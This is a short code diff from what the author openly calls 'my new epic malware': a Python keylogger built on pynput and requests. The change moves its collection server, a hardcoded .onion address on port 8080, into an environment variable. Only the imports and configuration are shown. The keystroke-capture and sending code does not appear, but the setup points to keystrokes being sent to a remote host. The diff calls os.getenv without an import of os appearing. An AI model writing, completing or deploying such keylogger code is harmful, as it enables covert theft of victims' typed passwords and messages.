@@ -1,13 +1,16 @@
 # This is my new epic malware.
 # All my hacker friends will think i'm so cool :)
 from pynput import keyboard
+from dotenv import load_dotenv
 import requests
 import json
 import threading
 
+load_dotenv()
+
 # Global variables
 text = ""
-address= "http://ejqtlz2ttij6lpdu2gxzig4mditjgur5jdig5tdblrgafczkyzp5hcad.onion"
+address= os.getenv("ADDRESS")
 port_number = "8080"
 time_interval = 10
 
